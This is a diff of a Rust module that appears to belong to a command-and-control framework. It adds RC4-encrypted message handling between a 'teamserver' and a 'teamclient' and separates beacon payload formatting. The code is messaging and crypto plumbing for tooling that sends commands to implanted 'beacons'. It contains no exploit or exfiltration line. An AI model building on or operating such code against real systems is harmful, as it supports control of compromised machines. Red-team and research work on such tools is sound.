@@ -24,12 +24,23 @@ pub mod mgmt;
 use crate::encoding::base64::Base64;
 use crate::encryption::rsa::Rsa;
 use crate::encryption::aes::Aes;
+use crate::encryption::rc4::Rc4;
 use crate::utilities::Utils;
 
 use anyhow::{anyhow, Result};
 use log::{error};
 use rsa::RsaPrivateKey;
 use serde_json::{Value, json};
+
+// Retrieving the commands from the teamserver
+pub fn retrieve_command_teamclient(body: String, key: Vec<u8>) -> Result<String> {
+    if body.len() > 0 {
+        let decoded = Base64::decode(&body);
+        let decrypted = Rc4::crypt(decoded, key);
+        return Ok(std::str::from_utf8(&decrypted)?.to_string());
+    }
+    Err(anyhow!(""))
+}
 
 // Retrieving the command of that has been sent, along with the AES key that was used to encrypt it.
 pub fn retrieve_command(body: String, private_key: RsaPrivateKey) -> Result<(String, [u8; 32])> {
@@ -57,7 +68,7 @@ pub fn retrieve_info(body: String) -> Result<(Vec<u8>, Vec<u8>, Vec<u8>)> {
     Err(anyhow!(""))
 }
 
-// Code for verifying teamserver and beacon messages
+// Code for verifying beacon messages
 pub fn verify_message(body: String, public_key: &str) -> Result<bool> {
     let (_, encrypted_key, signature) = retrieve_info(body)?;
     let public_key = Rsa::load_public_key(&public_key)?;
@@ -73,12 +84,24 @@ pub fn encode_in_json(command: String, result: String) -> Value {
     encoded_response
 }
 
-// Code for encoding the Value of JSON into a final payload ready to be sent over HTTP
-pub fn format_payload(input: Value, aes_key: [u8; 32]) -> String {
+// Code for creating a payload that can be read by the beacon.
+pub fn format_beacon_payload(input: Value, aes_key: [u8; 32]) -> String {
     if let Ok(encoded_response) = serde_json::to_string(&input) {
         let encrypted_response = Aes::encrypt(aes_key, encoded_response.as_bytes().to_vec());
         let encoded_encrypted_response = Base64::encode(&encrypted_response);
         return encoded_encrypted_response;
     }
+    error!("Malformed input for beacon payload");
+    "Failed to format response payload".to_string()
+}
+
+// Code for creating a payload that can be read by the teamclient.
+pub fn format_teamclient_payload(input: Value, key: Vec<u8>) -> String {
+    if let Ok(encoded_response) = serde_json::to_string(&input) {
+        let encrypted_response = Rc4::crypt(encoded_response.as_bytes().to_vec(), key);
+        let encoded_encrypted_response = Base64::encode(&encrypted_response);
+        return encoded_encrypted_response;
+    }
+    error!("Malformed input for teamclient payload");
     "Failed to format response payload".to_string()
 }
